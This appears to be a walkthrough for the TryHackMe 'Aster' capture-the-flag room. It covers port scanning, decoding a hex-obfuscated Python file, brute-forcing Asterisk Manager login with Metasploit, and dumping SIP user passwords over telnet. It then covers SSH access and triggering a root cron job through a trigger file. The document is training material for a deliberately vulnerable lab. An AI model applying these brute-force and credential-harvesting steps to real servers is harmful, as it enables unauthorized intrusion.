# [Aster](https://tryhackme.com/room/aster)

## Hack my server dedicated for building communications applications.

# Flags

### Compromise the machine and locate user.txt

1. Start by performing a comprehensive port scan using nmap to identify open services and their versions:

```bash
nmap -p- -sV <TARGET_IP>
```

**Result:**

```
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
1720/tcp open  h323q931?
2000/tcp open  cisco-sccp?
5038/tcp open  asterisk    Asterisk Call Manager 5.0.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

2. Navigate to `http://<TARGET_IP>/` and download the `output.pyc` file found on the web server. This is a compiled Python bytecode file that may contain useful information.

3. Use `uncompyle6` to decompile the Python bytecode file back to readable source code:

```bash
uncompyle6 output.pyc
```

**Result:**

```python
# uncompyle6 version 3.9.3
# Python bytecode version base 2.7 (62211)
# Decompiled from: Python 3.13.11 (main, Dec  8 2025, 11:43:54) [GCC 15.2.0]
# Embedded file name: ./output.py
# Compiled at: 2020-08-11 08:59:35
import pyfiglet
o0OO00 = pyfiglet.figlet_format('Hello!!')
oO00oOo = '476f6f64206a6f622c2075736572202261646d696e2220746865206f70656e20736f75726365206672616d65776f726b20666f72206275696c64696e6720636f6d6d756e69636174696f6e732c20696e7374616c6c656420696e20746865207365727665722e'
OOOo0 = bytes.fromhex(oO00oOo)
Oooo000o = OOOo0.decode('ASCII')
if 0:
    i1 * ii1IiI1i % OOooOOo / I11i / o0O / IiiIII111iI
Oo = '476f6f64206a6f622072657665727365722c20707974686f6e206973207665727920636f6f6c21476f6f64206a6f622072657665727365722c20707974686f6e206973207665727920636f6f6c21476f6f64206a6f622072657665727365722c20707974686f6e206973207665727920636f6f6c21'
I1Ii11I1Ii1i = bytes.fromhex(Oo)
Ooo = I1Ii11I1Ii1i.decode('ASCII')
if 0:
    iii1I1I / O00oOoOoO0o0O.O0oo0OO0 + Oo0ooO0oo0oO.I1i1iI1i - II
print o0OO00
return
```

4. The decompiled code contains hex-encoded strings. Decode them using [CyberChef](https://gchq.github.io/CyberChef/):

**First hex string decodes to:**

```
Good job, user "admin" the open source framework for building communications, installed in the server.
```

**Second hex string decodes to:**

```
Good job reverser, python is very cool!Good job reverser, python is very cool!Good job reverser, python is very cool!
```

The username **"admin"** is revealed, which we'll use for the Asterisk service.

5. Use Metasploit's Asterisk auxiliary module to brute force the admin credentials:

```bash
msfconsole
use auxiliary/voip/asterisk_login
show options
set RHOSTS <TARGET_IP>
set USERNAME admin
run
```

**Result:**

```
...
[+] <TARGET_IP>:5038     - User: "admin" using pass: "abc123" - can login on <TARGET_IP>:5038!
...
```

We found valid credentials - `admin:abc123`

6. Connect to the Asterisk Manager Interface using telnet and enumerate SIP users:

```bash
telnet <TARGET_IP> 5038

ACTION: login
USERNAME: admin
SECRET: abc123
EVENTS: on

ACTION: command
COMMAND: help

ACTION: command
COMMAND: sip show users
```

**Result:**

```
Response: Success
Message: Command output follows
Output: Username                   Secret           Accountcode      Def.Context      ACL  Forcerport
Output: 100                        100                               test             No   No
Output: 101                        101                               test             No   No
Output: harry                      p4ss#w0rd!#                       test             No   No
```

We found user **harry** with password **p4ss#w0rd!#**

7. Use the discovered credentials to SSH into the target machine:

```bash
ssh harry@<TARGET_IP>
# Password: p4ss#w0rd!#
```

8. Locate and read the user flag:

```bash
ls
cat user.txt
```

[SCREEN01]

---

### Reverse file and get root.txt

1. Copy the `Example_Root.jar` file from the target to your local machine for analysis:

```bash
scp harry@<TARGET_IP>:Example_Root.jar .
```

2. Extract and analyze the JAR file using Ghidra (or any Java decompiler like JD-GUI):

3. Examine the decompiled `main` function located at `Symbol Tree > Functions > main_java.lang.String[]_void`:

```java
/* Flags:
     ACC_PUBLIC
     ACC_STATIC

   public static void main(java.lang.String[])  */

void main_java.lang.String[]_void(String[] param1)

{
  File objectRef;
  PrintStream objectRef_00;
  boolean bVar1;
  FileWriter objectRef_01;

  objectRef = new File("/tmp/flag.dat");
  bVar1 = Example_Root.isFileExists(objectRef);
  if (bVar1) {
    objectRef_01 = new FileWriter("/home/harry/root.txt");
    objectRef_01.write("my secret <3 baby");
    objectRef_01.close();
    objectRef_00 = System.out;
    objectRef_00.println("Successfully wrote to the file.");
  }
  return;
}
```

The code checks if `/tmp/flag.dat` exists. If it does, it writes the root flag to `/home/harry/root.txt`. This is likely a cron job running as root.

4. Create the required trigger file to exploit the cron job:

```bash
echo "" > /tmp/flag.dat
```

5. The cron job should execute within a few minutes. Once executed, the root flag will be written to harry's home directory:

```bash
ls
cat root.txt
```

[SCREEN02]
